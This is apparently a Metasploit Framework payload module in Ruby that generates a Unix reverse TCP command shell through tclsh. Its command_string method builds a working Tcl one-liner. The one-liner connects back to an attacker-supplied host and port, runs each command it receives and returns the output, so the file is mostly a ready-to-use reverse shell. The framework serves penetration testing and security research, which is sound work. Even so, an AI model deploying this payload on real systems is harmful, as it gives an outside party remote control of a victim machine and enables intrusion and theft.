##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 184

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix Command Shell, Reverse TCP (via Tclsh)',
        'Description' => 'Creates an interactive shell via Tclsh',
        'Author' => ['bcoles'],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'tclsh',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    %(echo 'set s [socket #{datastore['LHOST']} #{datastore['LPORT']}];set c "";while {$c != "exit"} {flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s;};close $s;'|tclsh)
  end
end
